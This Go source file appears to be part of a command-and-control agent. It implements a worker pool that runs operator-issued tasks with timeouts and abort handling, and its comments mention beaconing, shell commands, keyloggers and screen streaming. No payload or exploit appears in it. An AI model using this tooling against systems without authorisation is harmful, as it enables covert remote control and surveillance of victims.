//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"bytes"
	"context"
	"fmt"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
)

// ── Task execution pool ──────────────────────────────────────────────────────
// Multiple workers drain the task queue concurrently so a single long-running
// or hung task can no longer serialize the whole queue (P6). Every task gets
// its own cancelable context with a hard timeout; an operator abort for a
// running task cancels that context, and runShell honors the current task's
// context so a user command (e.g. `shell sleep 3600`) is killed instead of
// wedging a worker until the timeout expires.

const (
	// defaultTaskWorkers sizes the task execution pool. A small pool keeps
	// per-task overhead negligible while still allowing a slow task to overlap
	// quick ones (ls, ps, beacon_now).
	defaultTaskWorkers = 4
	// defaultTaskExecTimeout bounds a single task's blocking execution. Network
	// relays, keyloggers, and screen streams run on their own goroutines, so
	// the ceiling only ever clips genuinely hung commands. Override via the
	// FC2_TASK_TIMEOUT_SECONDS environment variable.
	defaultTaskExecTimeout = 15 * time.Minute
	// maxQueuedTasks bounds the enqueue backlog. Beyond this the oldest waiting
	// task is evicted and returned as an error result instead of blocking the
	// beacon loop.
	maxQueuedTasks = 256
)

var (
	// execCtxMu guards execCtxByGID.
	execCtxMu sync.Mutex
	// execCtxByGID maps a goroutine id to the context of the task currently
	// being executed on that goroutine. Worker goroutines register themselves
	// for the duration of one task run so runShell can cancel blocking
	// commands; any other goroutine falls back to context.Background().
	execCtxByGID = map[uint64]context.Context{}

	// abortMu guards abortedTasks and execCancels.
	abortMu sync.Mutex
	// abortedTasks records operator-cancelled task ids so a queued-but-not-yet
	// started task is skipped and a running task is interrupted.
	abortedTasks = map[uint]bool{}
	// execCancels maps a running task id to its cancel func (present only while
	// the corresponding worker is inside executeTask).
	execCancels = map[uint]context.CancelFunc{}
)

// workerLoop consumes tasks until the channel closes. Each iteration runs at
// most one task and always produces a result so the server can finalize it.
func workerLoop() {
	for task := range taskQueue {
		result := runTask(task)
		if task.Key != "" {
			applyTaskKeyEncryption(task.Key, &result)
		}
		ensureResultID(&result)
		enqueueResult(result)
		inFastMode.Store(true)
		select {
		case beaconWake <- struct{}{}:
		default:
		}
	}
}

// runTask esbuilds the per-task execution scope (timeout context, abort wiring,
// goroutine-local context) around executeTask and post-processes the result so
// an interrupted command surfaces an operator-facing error.
func runTask(task Task) TaskResult {
	if isTaskAborted(task.ID) {
		return TaskResult{
			TaskID: task.ID,
			Type:   task.Type,
			Error:  "task aborted by operator before start",
		}
	}
	ctx, cancel := context.WithTimeout(context.Background(), taskExecTimeout())
	registerExecCancel(task.ID, cancel)
	setExecCtx(ctx)
	res := executeTask(task)
	setExecCtx(nil)
	unregisterExecCancel(task.ID)
	cancel()

	if isTaskAborted(task.ID) && res.Error != "" && isCancelRelatedError(res.Error) {
		res.Error = "task aborted by operator"
	}
	return res
}

// isCancelRelatedError reports whether an error string came from a Ctrl-C /
// context cancellation / process kill, i.e. it was caused by our abort or
// timeout rather than a real command failure.
func isCancelRelatedError(err string) bool {
	e := strings.ToLower(err)
	return strings.Contains(e, "canceled") || strings.Contains(e, "cancelled") ||
		strings.Contains(e, "killed") || strings.Contains(e, "signal") ||
		strings.Contains(e, "terminated")
}

// taskExecTimeout returns the per-task execution ceiling, honouring the
// FC2_TASK_TIMEOUT_SECONDS environment override.
func taskExecTimeout() time.Duration {
	if v := os.Getenv("FC2_TASK_TIMEOUT_SECONDS"); v != "" {
		if n, err := strconv.Atoi(v); err == nil && n > 0 {
			return time.Duration(n) * time.Second
		}
	}
	return defaultTaskExecTimeout
}

// ── Goroutine-local execution context ───────────────────────────────────────

// currentGoroutineID extracts the calling goroutine's id from the runtime
// stack. It is only used to scope the current task context per worker
// goroutine; the wire protocol never sees this value.
func currentGoroutineID() uint64 {
	var buf [64]byte
	n := runtime.Stack(buf[:], false)
	s := buf[:n]
	const prefix = "goroutine "
	i := bytes.Index(s, []byte(prefix))
	if i < 0 {
		return 0
	}
	rest := s[i+len(prefix):]
	end := 0
	for end < len(rest) && rest[end] >= '0' && rest[end] <= '9' {
		end++
	}
	if end == 0 {
		return 0
	}
	id, _ := strconv.ParseUint(string(rest[:end]), 10, 64)
	return id
}

// setExecCtx binds ctx to the calling goroutine so runShell (and anything it
// calls synchronously) can observe the current task's cancellation scope.
// Passing nil clears the binding.
func setExecCtx(ctx context.Context) {
	id := currentGoroutineID()
	execCtxMu.Lock()
	if ctx == nil {
		delete(execCtxByGID, id)
	} else {
		execCtxByGID[id] = ctx
	}
	execCtxMu.Unlock()
}

// currentExecCtx returns the task context currently executing on this
// goroutine, or context.Background() when the caller is not a task worker
// (fire-and-forget background commands must not be bounded by beacon teardown).
func currentExecCtx() context.Context {
	execCtxMu.Lock()
	defer execCtxMu.Unlock()
	if ctx := execCtxByGID[currentGoroutineID()]; ctx != nil {
		return ctx
	}
	return context.Background()
}

// ── Abort / cancellation ────────────────────────────────────────────────────

func registerExecCancel(id uint, cancel context.CancelFunc) {
	abortMu.Lock()
	execCancels[id] = cancel
	abortMu.Unlock()
}

func unregisterExecCancel(id uint) {
	abortMu.Lock()
	delete(execCancels, id)
	abortMu.Unlock()
}

// isTaskAborted reports whether the operator cancelled the task with the given
// id (either before it started or while it is running).
func isTaskAborted(id uint) bool {
	abortMu.Lock()
	defer abortMu.Unlock()
	return abortedTasks[id]
}

// cancelTaskExecution aborts a task: queued tasks are skipped by the worker,
// running tasks get their context cancelled so blocking commands are killed.
func cancelTaskExecution(id uint) {
	abortMu.Lock()
	abortedTasks[id] = true
	cancel := execCancels[id]
	abortMu.Unlock()
	if cancel != nil {
		cancel()
	}
}

// handleAbort is the handler for server-injected abort tasks. The server sends
// one (Command = target task id as decimal) when an operator cancels a task
// that is already running, so the agent can interrupt the underlying command
// rather than waiting for its timeout.
func handleAbort(task Task, res *TaskResult) {
	id, err := strconv.ParseUint(strings.TrimSpace(task.Command), 10, 64)
	if err != nil || id == 0 {
		res.Error = "abort: invalid target task id"
		return
	}
	cancelTaskExecution(uint(id))
	res.Output = fmt.Sprintf("abort signal sent to task %d", id)
}
